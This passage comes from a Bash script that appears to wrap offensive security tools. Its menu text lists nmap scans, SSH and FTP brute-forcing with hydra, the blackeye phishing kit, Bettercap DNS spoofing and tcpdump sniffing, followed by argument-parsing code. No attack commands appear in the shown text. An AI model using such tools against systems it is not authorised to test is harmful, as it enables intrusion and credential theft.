	echo -e "                    │    └── ${red_color}002.3 - Single IP nmap scan (intensive scan)${normal_color}"
	echo "                    │ "
	echo "                    └── 003 - Bruteforce menu"
	echo "                    │    └── 003.1 - SSH hydra bruteforce"
	echo "                    │    └── 003.2 - FTP hydra bruteforce"
	echo "                    │ "
	echo "                    └── 004 - Spoof menu"
	echo -e "                    │    └──${green_color} 004.1 - Execute blackeye${normal_color}"
	echo -e "                    │    └──${green_color} 004.2 - Bettercap DNS spoof${normal_color}"
	echo "                    │ "
	echo -e "                    └── ${green_color}005 - Rkhunter scan ${normal_color}"
	echo "                    │ "
	echo "                    └── 006 - Raspberry pi menu"
	echo -e "                         └── ${green_color}006.1 - SSH a raspberry pi ${normal_color}"
	echo "                         └── 006.2 - Sniff in the raspberry pi with tcpdump"
	echo -e " [═══════════════════════════════════════════════════════════════════════════════]${normal_color}"
	echo


elif [[ "$1" == "-qa" || "$1" == "--qa" || "$1" == "-quick-access" || "$1" == "--quick-access" || "$1" == "-QA" || "$1" == "--QA" || "$1" == "-QUICK-ACCESS" || "$1" == "--QUICK-ACCESS" ]]
then
	soy_un_numero='^[0-9]+$'
	if [[ $2 =~ $soy_un_numero ]]
	then
		continue_root=n
		check_root_permissions
		read_quick_access
	else
		echo -e "${red_color} Error!${normal_color} $1 ${white_color}is not a number..."
		echo -e " Type${normal_color} -h${white_color} to see the available options. ${normal_color}"
		exit 0
	fi



else
	if [[ $2 = "" ]]
	then
		echo -e "${red_color} Error!${normal_color} $1 ${white_color}is not an option..."
		echo -e " Type${normal_color} -h${white_color} to see the available options. ${normal_color}"
		exit 0
	elif [[ $1 != "" && $2 != "" && $3 == "" ]]
	then
		echo -e "${red_color} Error!${normal_color} $1 $2 ${white_color}are not options..."
		echo -e " Type${normal_color} -h${white_color} to see the available options. ${normal_color}"
		exit 0
	elif [[ $1 != "" && $2 != "" && $3 != "" && $4 == "" ]]
	then
		echo -e "${red_color} Error!${normal_color} $1 $2 $3 ${white_color}are not options..."
		echo -e " Type${normal_color} -h${white_color} to see the available options. ${normal_color}"
		exit 0
	else
		echo -e "${red_color} Error!${normal_color} $1 ${white_color}is not an option..."
		echo -e " Type${normal_color} -h${white_color} to see the available options. ${normal_color}"
		exit 0
	fi
fi

cd $ACTUAL_FOLDER
exit 0
#TODO############# E S P ##################
#!################ A Ñ I ##################
#TODO############# T A ~ ################## ©
